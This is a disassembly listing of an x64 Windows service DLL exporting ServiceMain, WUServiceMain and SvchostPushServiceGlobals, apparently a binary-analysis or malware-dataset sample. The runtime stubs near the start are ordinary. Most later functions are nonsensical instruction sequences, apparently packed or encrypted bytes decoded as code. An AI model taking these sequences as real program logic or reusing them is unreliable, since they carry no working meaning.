lea rax [ rbp + 0xb0 ]
mov [ rbp + 0x20 ] rax
__CxxFrameHandler
jmp __CxxFrameHandler@IAT
GetModuleFileNameExW
jmp [ GetModuleFileNameExW@IAT ]
sub_1800039d0
cmp rcx [ rw-data ]
jne r-xdata
jmp sub_180003b2c
rol rcx 0x10
test cx 0xffff
jne r-xdata
ror rcx 0x10
retn
sub_1800039f0
sub rsp 0x28
mov r8 [ r9 + 0x38 ]
mov rcx rdx
mov rdx r9
call sub_180003a10
mov eax 0x1
add rsp 0x28
retn
__crt_debugger_hook
and [ rw-data ] 0x0
retn
__crtCreateEventExW
mov r10 [ rw-data ]
mov eax r8d
xor r10 [ rw-data ]
je r-xdata
and eax 0x1
mov r9 rdx
and r8d 0x2
mov edx eax
jmp [ CreateEventW@IAT ]
jmp r10
__crtCreateSemaphoreExW
mov r10 [ rw-data ]
xor r10 [ rw-data ]
je r-xdata
jmp [ CreateSemaphoreW@IAT ]
jmp r10
__crtCreateSymbolicLinkW
sub rsp 0x28
mov rax [ rw-data ]
xor rax [ rw-data ]
je r-xdata
mov ecx 0x78
call [ SetLastError@IAT ]
xor al al
add rsp 0x28
retn
add rsp 0x28
jmp rax
__crtFlsAlloc
mov rax [ rw-data ]
xor rax [ rw-data ]
je r-xdata
jmp [ TlsAlloc@IAT ]
jmp rax
__crtFlsFree
mov rax [ rw-data ]
xor rax [ rw-data ]
je r-xdata
jmp [ TlsFree@IAT ]
jmp rax
__crtFlsGetValue
mov rax [ rw-data ]
xor rax [ rw-data ]
je r-xdata
jmp [ TlsGetValue@IAT ]
jmp rax
__crtFlsSetValue
mov rax [ rw-data ]
xor rax [ rw-data ]
je r-xdata
jmp [ TlsSetValue@IAT ]
jmp rax
__crtGetFileInformationByHandleEx
sub rsp 0x28
mov rax [ rw-data ]
xor rax [ rw-data ]
je r-xdata
mov ecx 0x78
call [ SetLastError@IAT ]
xor eax eax
add rsp 0x28
retn
add rsp 0x28
jmp rax
__crtGetShowWindowMode
sub rsp 0x98
lea rcx [ rsp + 0x20 ]
call [ GetStartupInfoW@IAT ]
test [ rsp + 0x5c ] 0x1
movzx ecx [ rsp + 0x60 ]
mov eax 0xa
cmovne eax ecx
add rsp 0x98
retn
__crtGetTickCount64
sub rsp 0x28
mov rax [ rw-data ]
xor rax [ rw-data ]
je r-xdata
call [ GetTickCount@IAT ]
mov eax eax
add rsp 0x28
retn
add rsp 0x28
jmp rax
__crtInitializeCriticalSectionEx
sub rsp 0x28
mov rax [ rw-data ]
xor rax [ rw-data ]
je r-xdata
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov eax 0x1
add rsp 0x28
retn
add rsp 0x28
jmp rax
__crtSetFileInformationByHandle
sub rsp 0x28
mov rax [ rw-data ]
xor rax [ rw-data ]
je r-xdata
mov ecx 0x78
call [ SetLastError@IAT ]
xor eax eax
add rsp 0x28
retn
add rsp 0x28
jmp rax
__crtSetThreadStackGuarantee
mov rax [ rw-data ]
xor rax [ rw-data ]
je r-xdata
xor eax eax
retn
jmp rax
SetUnhandledExceptionFilter
jmp [ SetUnhandledExceptionFilter@IAT ]
Sleep
jmp [ Sleep@IAT ]
__crtTerminateProcess
push rbx
sub rsp 0x20
mov ebx ecx
call [ GetCurrentProcess@IAT ]
mov edx ebx
mov rcx rax
add rsp 0x20
pop rbx
jmp [ TerminateProcess@IAT ]
__crtUnhandledException
push rbx
sub rsp 0x20
mov rbx rcx
xor ecx ecx
call [ SetUnhandledExceptionFilter@IAT ]
mov rcx rbx
add rsp 0x20
pop rbx
jmp [ UnhandledExceptionFilter@IAT ]
memset
jmp [ memset@IAT ]
strcpy
jmp [ strcpy@IAT ]
memcmp
jmp [ memcmp@IAT ]
strlen
jmp [ strlen@IAT ]
strcat
jmp [ strcat@IAT ]
strcmp
jmp [ strcmp@IAT ]
__C_specific_handler
jmp [ __C_specific_handler@IAT ]
??_U@YAPEAX_K@Z
jmp [ operator delete[]@IAT ]
_purecall
jmp [ _purecall@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
_amsg_exit
jmp [ _amsg_exit@IAT ]
InitSecurityInterfaceA
jmp [ InitSecurityInterfaceA@IAT ]
WinVerifyTrust
jmp [ WinVerifyTrust@IAT ]
sub_180003fc0
xor edx edx
jmp [ rw-data ]
sub_180004150
sub rsp 0x48
lea rax [ r--data ]
mov [ rsp + 0x28 ] ecx
mov [ rsp + 0x30 ] rdx
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x38 ] 0x0
mov [ rsp + 0x20 ] rax
call _CxxThrowException
IsProcessorFeaturePresent
jmp [ IsProcessorFeaturePresent@IAT ]
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
memcpy
jmp [ memcpy@IAT ]
sub_180004496
push rbp
sub rsp 0x20
mov rbp rdx
mov [ rw-data ] 0xffffffff
add rsp 0x20
pop rbp
retn
sub_1800044af
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
xor ecx ecx
cmp [ rax ] 0xc0000005
sete cl
mov eax ecx
mov eax ecx
add rsp 0x20
pop rbp
retn
sub_1800101d6
retn
sub_180011010
adc [ rsi ] ecx
jmp 0x14dd41a52
sub_180011090
sti
cmp edx [ 0x185ea85a8 ]
sbb al [ rdx + 0x58fd7677 ]
xlat
push rbp
and edx [ rdx ]
fist [ rbx + 0x7de40e4c ]
sar [ rdi ] 0x1
sub_1800115d0
std
sbb dl bl
or eax 0x67215043
jpe rwxdata
add bh [ rcx - 0x115fa01a ]
push r8
mov eax [ 0x9140965f87666250 ]
int3
insb
sub ah [ rax ]
test al 0x10
sub_1800117f0
pop rdi
std
sub_180011a2d
jg rwxdata
xlat
or eax [ rcx - 0x33 ]
pop rcx
out 0x54 al
xchg esi eax
pop rcx
sub_180011a68
pop rsi
std
sub_180011a84
shr al 0x1
rol [ rcx - 0x35f66d00 ] 0x62
sbb [ rdx ] ch
sti
call 0x18992dbba
sub_180011aa0
sub_180011abc
adc al 0xcd
pop rcx
scasb [ rdi ]
out 0x41 al
int3
sub_180011b00
adc al 0xcd
and ebp [ rsi + 0x493fe84d ]
push rax
push rax
mov eax [ 0x706ca218ab521cb6 ]
sbb dh ch
test ch al
mov eax 0x32a75410
xchg esp eax
sbb al 0x8b
sub_180011b20
sbb al 0x8b
sub_180011b60
sbb al 0x8b
sub_180011bb0
rcr [ rbp - 0xc ] 0x1
rcr [ rbx + 0x434573 ] 0x1
ror [ rdi - 0x4d0011f6 ] cl
sub [ rbp + 0x2df26625 ] ecx
sub_180011c50
or bh bh
sub al 0x17
adc [ rdi - 0x17 ] esi
sub_180011cf0
push rax
push rsp
xlat
imul esi edx 0xc60b5a
or al 0xf
or esp esi
or eax 0xfa307a65
insd
mov eax [ 0xd9f2a9740e2bcdb6 ]
xor [ rdx ] ecx
sub_180011d30
push rdi
retn
sub_180011de0
jns rwxdata
push 0xffffffffffffff9b
out dx eax
push rdi
sub_180011f10
adc eax 0x5e97511
adc ebp [ rbx ]
add [ rcx ] 0xe49b99e0
mov al [ 0xff5d66085410a67b ]
xchg ebp eax
sub_180011ff0
pop rcx
jrcxz rwxdata
sub [ rcx - 0x495ffe60 ] ebp
sub_1800120e0
enter 0x346 0x5d
sub_180012140
sub_180012170
pop rbp
add esi esp
popfq
int 0x5f
hlt
sub_1800121b0
retn
sub_180012220
xchg [ rcx + 0x2b ] eax
iretd
sub_180012c00
adc al 0x25
and bl [ rdx + 0x29 ]
or [ rsi + rbp * 2 ] ecx
jmp 0x104350a4a
sub_180012c80
div bh
pop rbp
add al dl
call 0x11271ae4b
or eax 0xcddd0f6c
xchg edx eax
clc
and ebx ecx
mov ecx 0x7c46bdde
sub ecx ecx
sub_180012cf0
jno rwxdata
lodsd [ rsi ]
retn
sub_180012d90
sub_180012ee0
sub_1800133df
sub_180013400
adc [ rsi * 8 - 0x2cffa309 ] ebp
loope rwxdata
adc [ rsi * 8 - 0x2cffa309 ] ebp
sub_1800134c0
in eax 0x5f
sub_180014d4d
adc [ rax + 0x7e ] ebx
push rdx
push rsp
mov edi 0x2ca9ec5f
sub_180014db0
retn
sub_180015760
sbb al 0x89
sub_18001577d
sub al 0xa9
sub_180015840
sub_180015850
or ch bh
and eax 0x2109bcc1
test [ rbp + 0x5f ] esp
xor esi [ rax ]
out dx eax
adc [ rax - 0x61 ] edx
mov eax [ 0x4af46d107c9495d3 ]
mov dl 0xf7
cmpsd [ rsi ] [ rdi ]
push rcx
sub_180015920
push rsp
pop rbx
mov edi 0xaa9f90eb
pop rdx
loopne rwxdata
stosb [ rdi ]
adc [ rbp + rbx * 8 + 0x34 ] dl
push rdi
sub_180015940
or [ rax ] ecx
movsd [ rdi ] [ rsi ]
sbb esp esp
pop rsi
sub [ r11 - 0x6d ] eax
scasb [ rdi ]
test eax 0x1884db14
mov [ 0x10aa42c111d87844 ] al
push rsp
fnsave [ rdi + rdx * 2 ]
sub_180015950
sbb [ rdx + 0x11d87844 ] ah
rol [ rdx - 0x56 ] 0x10
push rsp
fnsave [ rdi + rdx * 2 ]
sub_180015990
imul ebp [ rbx ] 0xd42b73bc
out dx al
push rax
adc dl [ rax + rbp * 4 + 0x58 ]
iretd
sub_1800159e0
imul eax [ rdx + 0x58ce3d57 ] 0xffffffd5
in al 0xa5
push 0xffffffff8104b50b
in eax 0x4c
xor [ rax - 0x4266371 ] 0x9241b15d

sub_180016310
adc [ rax ] ebx
mov [ 0xef56d2c0bda47044 ] al
sub_180016350
add esi [ rdi - 0x1 ]
adc [ rdi ] ecx
jmp 0x1d1ff6692
sub_180016710
adc [ rsi ] eax
imul ebp [ rcx ] 0x6dac63bc
and [ rcx ] esp
sub_1800167c0
not [ 0x1dcf95cf2 ]
add bl dl
adc esi esi
jrcxz rwxdata
mov [ 0xe33e46af9c44abef ] eax
sbb [ rdx ] ch
pop rdx
push 0x50a84020
adc ah [ rcx ]
mov [ 0xe4e7fb211cc56307 ] eax
insd
and edi ebx
sub_180016d00
retn 0x8869
sub_180016d20
sbb al 0x8b
sub_180016d80
sub_180016f54
in al dx
insd
cmpsd [ rsi ] [ rdi ]
sub_180017160
sub_180017360
add bl [ rdi + 0x6b ]
adc [ rdi + 0x3f ] 0xd3
xchg ebx eax
sub_1800173e0
jl rwxdata
push rdi
rcl [ rcx + 0x6a1598b8 ] cl
or edi ebp
sub_1800177f0
pop rcx
jrcxz rwxdata
adc eax 0x8659cd41
add eax 0xe155c34e
sbb al 0x2c
cld
not [ rbp + 0x1e ]
fisttp [ rbx ]
sub_180017a50
or cl ch
cmp ecx [ rdx ]
ror ebp cl
rcl [ rcx ] 0xa4
add bh [ rsi - 0x56 ]
lodsd [ rsi ]
sub_180017ca0
and bl [ rax ]
cld
jl rwxdata
test al 0xaf
cmp [ rdi + 0x5857dfef ] bh
sub ah dl
sub_180017cd0
and eax 0x5709bcc1
mov r13b 0x71
enter 0x5ade 0x1f
jle rwxdata
xchg edx eax
sub ebx [ rdi + 0x57 ]
retn 0x4879
fstp st3
retn 0x6e15
sub_180017d00
pop rsi
add bl dl
call 0x1779afec9
or eax 0x6ed90a76
sub_180017d90
jb sub_180017d90
sub_180018100
pop rdi
sub_180018390
jb sub_180018390
sub_180018730
push rbx
pop rbp
add esi esp
xchg ebp eax
int 0x53
jmp 0x116001106
sub_180018780
sub_180018f40
add dl dl
call 0x17f831108
sub [ rdi - 0x56 ] 0x52
retn
sub_180018fb0
rcr [ rbp - 0xc ] 0x1
rcr [ rbx + 0x434573 ] 0x1
ror [ rdi - 0x1d0013f6 ] cl
or al 0xa0
and [ rax ] bpl
jns rwxdata
in eax dx
and al 0x52
fstpnce st0
0x7419
sub_1800195a0
pop rbx
jl rwxdata
push rdi
fiadd [ rbp + 0x15 ]
push rdx
push rsp
cmp eax 0xe4ccfd5e
test [ rdx ] ecx
mov ch 0xc8
push rbx
jmp 0x121d73402
sub_180019b60
sub_18001a670
sub_18001a7f0
imul eax [ rdx - 0x3828729d ] 0xe94d1a00
cmpsd [ rsi ] [ rdi ]
sub_18001a800
sub_18001a8b4
mov [ rbx - 0x2811328b ] 0xda
leave
mov esi 0x48ee3490
idiv [ rdx + rax * 8 - 0x79 ]
insd
sub_18001a960
sub_18001aad0
adc al 0x7
sub_18001b1d0
sti
sub_18001b690
sti
cmp edx [ 0x198ff2ca8 ]
fdivr [ rax ]
sub_18001b710
adc [ rsi ] eax
jbe rwxdata
add al 0x1a
std
and eax 0x193044a2
and esp ebp
xchg ecx eax
add eax 0xe6811dd0
cwde
lahf
lodsd [ rsi ]
sub_18001b840
mul ecx
adc rax 0x350af5c4
mov esp 0x8d29ccfb
adc eax 0xe4e19f28
xchg edi eax
sub_18001b910
adc [ rsi ] eax
jbe rwxdata
fwait
add al 0x1a
std
sub al 0x77
jmp 0x12ce1ba65
sub_18001bf60
sub_18001bfa0
test eax 0x122b3e38
rcr [ rcx ] 0x67
fsub [ rbx ]
sub_18001c110
sub_18001cfb3
shl [ rdx - 0x4a ] 0x1
sub_18001d020
sbb [ rsi - 0x17 ] 0x77
sub_18001d1a0
pop rbx
jl rwxdata
xchg ebp eax
mov es sp
scasd [ rdi ]
cli
push rdi
fiadd [ rbp + 0x15 ]
push rdx
push rsp
cmp eax 0xe4cefd5e
0x7e83
sub_18001d400
adc eax 0x8afef52c
lodsd [ rsi ]
lodsd [ rsi ]
loope rwxdata
test [ rdx - 0x3cc23f5b ] edx
push rsi
test [ rcx - 0xa82132b ] eax
mov esi 0x9e65eecd
sbb rax 0xffffffffb92463da
pop r15
test [ rax + 0x1aa15042 ] ah
sub_18001d450
sbb bh dh
and eax 0x1111bcc1
push rsi
sub eax 0x216036d4
sub_18001d510
adc eax 0xd3e07511
mov bh 0x80
sub al 0xa8
jl rwxdata
cmp [ rdx ] cl
shl [ rsi ] cl
frstor [ rdi - 0x6c ]
shl [ rsi ] cl
adc [ rsp + rcx * 2 - 0x5d ] dl
dec [ rsp - 0x9 ]
sub_18001d560
add eax [ rax - 0x57 ]
cmp [ rsi ] dh
and dl [ rdx ]
fbld [ rdx - 0x79 ]
stosb [ rdi ]
sub_18001d647
pmullw mm6 [ rbx + rdx * 4 + 0x7866fc0d ]
jmp 0x14b274226
sub_18001d710
add eax [ 0x1581ad576 ]
test al 0x78
push rbp
sub_18001db00
adc rax 0x3b03f5c4
loopne rwxdata
imul ecx
jl rwxdata
shr eax 0x1
retn
ja rwxdata
shl [ rbp + 0x69e0426 ] cl
add ah [ rcx - 0x5e ]
ficom [ rbx ]
insb
sub_18001e050
or eax 0x11162cff
je rwxdata
sub al 0xff
not [ rax + rax - 0x27 ]
movsxd esp [ rcx + rdi * 4 ]
pop r15
test [ rax + 0xda15042 ] ah
[ rsi + rdx ]
sub_18001e300
pop rsp
or [ rsi ] eax
sub_18001e410
add ecx [ 0x198181115 ]
mov al [ 0xdf216936d429f044 ]
sbb al 0xb7
sub_18001e640
mul ecx
shr [ r9 - 0x40 ] 0x46
mov dh 0x50
xchg ebx eax
or eax 0x73330a6e
adc eax ecx
xchg edi eax
sub_18001e830
std
sub_18001e8c2
or [ rsi ] eax
or ch [ fs : rsi + 0x249bd4c7 ]
push rax
mov eax [ 0x474009bcc12550b6 ]
pop rbx
test al 0x36
adc ah [ rcx - 0x11 ]
sub_18001e8d0
and eax 0x4009bcc1
pop r11
test al 0x36
adc ah [ rcx - 0x11 ]
sub_18001f150
sbb [ rdx - 0x204c87bc ] ah
mov r13 0x210b2bd2a8543557
push rsp
or [ rsi ] ch
xor eax 0x21d1622
sub_18001f1a0
jge rwxdata
adc eax [ rcx - 0x7b ]
xchg ebp eax
xchg bl bl
pop rax
fild [ rcx ]
sub_18001f1f0
pop rdi
std
sub_18001f260
push rdi
cmp eax 0x48b893d3
sub_18001f2b0
sub_18001f320
push rcx
add al [ rax - 0x57 ]
cmp [ rsi ] dh
and edx [ rdx ]
sub_18001f3e0
imul eax [ rcx + 0x3077e95e ] 0x11
adc eax 0x85d822f
cmp esp ebx
sti
sub_18001f450
sub_18001f481
cli
cmp [ 0x1660c852a ] 0x15
fcmovne st4
sub [ rbx - 0x731dd3e8 ] ebp
push rbp
sub_18001f587
jb rwxdata
scasd [ rdi ]
mov ah 0xb7
or eax 0x60307b25
std
sbb al bl
pop rbp
or bl ch
sbb eax 0xd42fb11b
int1
mov [ gs : rax ] gs
sub dl ah
sub_18001f590
sub_18001f600
or ch dh
sahf
int3
sub_18001f680
dec [ rdx - 0x34174a53 ]
cmpsb [ rsi ] [ rdi ]
sbb [ rax - 0x79 ] dl
pop rdi
adc cl [ rax - 0x17 ]
sub_18001f697
push 0xffffffffe0f30514
cdq
and [ rbp + rax + 0x1cc61222 ] cl
adc [ rsi - 0x10 ] 0x8b8a3c36
xchg esi eax
sbb dh ch
push 0xb
fisub [ rsi ]
jo rwxdata
test [ rdi + 0x6d ] ebx
mov al [ 0xafbd5f788f496d42 ]
0x989
sub_18001f6fc
int 0x59
xchg [ rbp + 0x52 ] bl
sub_18001f710
or dl bl
int 0xe0
adc eax 0x12286168
jpe rwxdata
xor al 0xb0
or [ rcx ] dl
xchg ebx eax
test al 0x2d
sub_18001f7b0
retn
sub_18001fc50
or al 0xe0
out dx al
scasb [ rdi ]
sub_18001fcf0
jae rwxdata
and eax 0x29cd8420
xchg esp eax
outsb
sbb dh [ rsi + 0xf5bda85 ]
in ax 0x96

sub_180020810
adc [ rdi ] ecx
jmp 0x1e0080b4f
sub_180021260
cmp al 0xcc
push rcx
add ebx [ rbp + 0x62 ]
push rbp
out 0x5 eax
or [ r10 ] bpl
pushfq
movsd [ rdi ] [ rsi ]
SvchostPushServiceGlobals
mov [ 0xa0b97109ad2b7d9 ] eax
out dx al
or esi [ rbp - 0x3cd5f7b3 ]
pop rdi
std
add al 0x36
mov dh 0x7
adc eax 0x4f57cd41
lea eax [ rdi - 0x36170a84 ]
jg rwxdata
rcr [ rdx + 0xa0b9710 ] cl
sub_1800213b0
retn
ServiceMain
loopne rwxdata
hlt
WUServiceMain
xor [ rax - 0x11 ] 0xffffffab
mul [ 0x1c2b76d75 ]
sub_1800216b0
lea esp [ rdi + 0x52 ]
push rsp
sub_180021870
sub_180021b60
add ecx [ rcx + 0x7e ]
xchg ebp eax
sub ecx r13d
push rcx
jge rwxdata
sbb eax 0x57c34d2c
loope rwxdata
pop rbp
jmp 0x10503b957
adc [ rdx ] ch
jmp 0x1396777d6
xor ah [ rdx - 0x9 ]
sub_180021d30
push rdi
sub_180022240
sub al 0xf7
neg [ rsi + 0x14 ]
int 0x21
scasb [ rdi ]
sub_180022350
sbb [ rdx + 0x21136844 ] ah
and [ rsi - 0x18 ] esp
pop rax
fldlg2
or [ rsi + rdi * 2 + 0x622c00a8 ] ebx
cwde
lahf
mov edi 0x598d6640
push rbx
std
sub_180022372
sar esi 0x1
add [ 0x1640d0e23 ] 0xffffffffe8ada64f

sub_180022726
cmp ebp ecx
pop rdi
imul edx [ rdx + 0x54 ] 0x3d
pop rsi
std
sub_1800227f0
pop rbp
hlt
sub_180022830
jrcxz rwxdata
outsd
mov esp 0xcd3fe892
or al 0x0
pop rcx
0x5d34
sub_1800228a0
and bl [ rax ]
cld
jl rwxdata
std
call 0x1b50a0680
test [ 0x1eeb7345b ] dl
xchg ecx edi
scasd [ rdi ]
sbb eax 0x8305b862
DllUnregisterServer
outsb
xchg ecx edi
sub_180022980
int 0x23
scasb [ rdi ]
push rbp
pop rsi
mov [ 0xceaf7728afbc69e7 ] eax
sub_180022b25
and bl [ r8 ]
in al 0x1a
cdqe
add [ rbx ] ch
std
sub_180022c10
sbb dl bl
sub_180022ce0
int 0x47
adc eax 0x43816b5c
and cl dh
in al 0x1a
pushfq
movsb [ rdi ] [ rsi ]
cmp [ r11 ] bpl
rcr ebx cl
or [ rdx ] 0xffffff86
jpe rwxdata
sub_180022df0
pop rcx
hlt
sub_180022e50
or dh bh
cmp al [ rbx ]
add al 0x60
std
adc [ rbx - 0x6b ] edi
sub_180023c20
xchg ebp eax
sub ecx esi
push rcx
add al [ rax - 0x55 ]
xchg [ rbx + 0x63084db5 ] bl
sub_180023d30
push rcx
pop rbp
add esp esi
sub_1800242f9
xlat
shr [ rcx - 0x46 ] 0x45
insd
or [ rcx ] ecx
or dl cl
adc ah [ 0x1c8f73e36 ]
jo rwxdata
xchg [ rax ] dh
test al 0x50
mov eax [ 0x50a82630865a18b6 ]
sub_180024317
cmp [ rcx + 0x29 ] ch
cld
xor al 0xaf
sub eax 0x3e9d7ed4
pop rax
sub_1800243b0
xlat
cmp al 0x4e
xchg ebx eax
and eax 0x47c858d7
fwait
fistp [ r8 ]
add ebx esi
mov cl 0x3c
call 0x1860c0e11
xchg ecx eax
sub_1800246c0
dec [ rdx - 0x34174253 ]
and [ rbp + 0x62dcc9b ] eax
je rwxdata
fsubr [ rsi - 0x7da8bde0 ]
mov al ch
dec [ rdx - 0x34174253 ]
sub_180024820
xchg [ rax + 0x3d ] eax
fiadd [ rdi + 0x1 ]
test eax 0xc4f95b86
iretd
sub_180024900
pop rsp
or [ rsp + rcx * 2 ] eax
mov [ 0xf1742e2dccb6a16d ] al
sub_180024d49
sub_180024d67
sub_180024da3
and bl [ r10 ]
cld
mov ah 0x4
adc eax 0x2738436a
pop rax
sub_180024dd0
sti
sub_180025cd0
sub al 0x14
adc [ rsi - 0x3 ] esi
sbb al bl
sub_180025ef0
jne rwxdata
in al 0x78
dec [ rdx - 0x1ff29d9c ]
retn
sub_180025f60
adc eax 0xae816b5c
xor bl [ rdi ]
adc [ rdx ] ebp
in al dx
sub_180026890
jmp 0x1e0086bcd
sub_180026f50
add esi [ rax - 0x2d ]
mov bh 0xe0
sub [ rcx + 0x61 ] dh
pop rcx
fisttp [ rdx + 0x6c ]
pop rbp
sub_180026ff0
imul esi edx 0xca1c8f6e
add [ rbx ] dl
sub_180027050
sbb bh ah
sub al 0x17
adc [ rdi - 0x17 ] esi
sub_1800270f0
jno rwxdata
add bh [ rsi + 0x22068021 ]
0x5989
sub_1800271c0
call 0x173ebf386
cmp cl [ rax + 0x3399110e ]
nop
sub_180027275
0x7189
sub_180027280
div bh
pop rbp
or [ rsi ] eax
push 0x24
fst [ rdi ]
mov bh 0x60
sub_180027350
sbb [ rdx + 0x23137844 ] ah
or ch [ fs : 0x1e5a79436 ]
pop rdi
xor edi [ rdi + rsi * 4 - 0x6a632a0b ]
scasb [ rdi ]
mov bl 0xef
0x964c
sub_1800273a0
pop rbx
sub_1800273e0
sub_180027570
sub_180027670
rcl [ rdx - 0x35da175b ] 0x1
xchg ecx ebx
pop r11
or eax [ rdi + 0x61 ]
int 0x53
in al dx
mov dh 0x41
0xa0c0
sub_1800276a2
sbb al 0x8b
sub_1800276c0
in eax 0x5f
sub_1800292c0
in eax 0x48
adc eax 0xec0af5c4
pop r11
and [ rax + 0x65281842 ] 0x18
in al 0x9b
sbb [ rbp + rdi * 4 + 0x36a9237b ] ch
sub_1800294e0
rcl [ rbx + 0x5f6220b8 ] cl
sub_180029500
retn 0x8869
sub_180029520
pop rax
xlat
in al 0x2
pushfq
popfq
movsxd edx ebx
sub_180029540
add bl dl
loope rwxdata
xor eax 0x9cd42118
mov ebx 0x2b6f1434
and eax 0xe9615a22

sub_180029740
adc al 0xcd
and ebp [ rsi - 0x3bc016b3 ]
call 0x17ea3b516
sub_180029780
shl edi cl
add edi [ rcx ]
loopne rwxdata
shl [ 0x185588ba7 ] 0x8b
shl [ rdx - 0x3a7589a9 ] 0x1
retn 0x68ae
sub_180029850
or eax 0xd30a38ff
int 0x88
sbb [ rbx + rax + 0x5866a87e ] ah
fld [ rbp + 0x109a050a ]
sbb al 0x83
and eax 0x57c8e9c
sub_1800298d0
adc al 0x11
jbe rwxdata
adc [ rsi - 0x3 ] esi
sbb al bl
sub_180029970
push rsp
sub_180029a60
sub ecx r15d
push rcx
add [ rcx + 0x7c ] ecx
xchg ebp eax
pop rsp
loopne rwxdata
xchg rdi rax
mov eax esi
sub al 0x5c
jrcxz rwxdata
movsd [ rdi ] [ rsi ]
xchg edi eax
sub_180029b20
sbb al 0x89
sub_180029f0a
sub_180029f28
pop rbp
sub_18003fc09
retn 0xb835
sub_180040701
fsub [ r8 - 0x491292e3 ]

sub_180040f16
rcr [ rsi ] 0x40
0x317c
sub_180040f48
iretd
j_sub_180040f34
jmp sub_180040f34
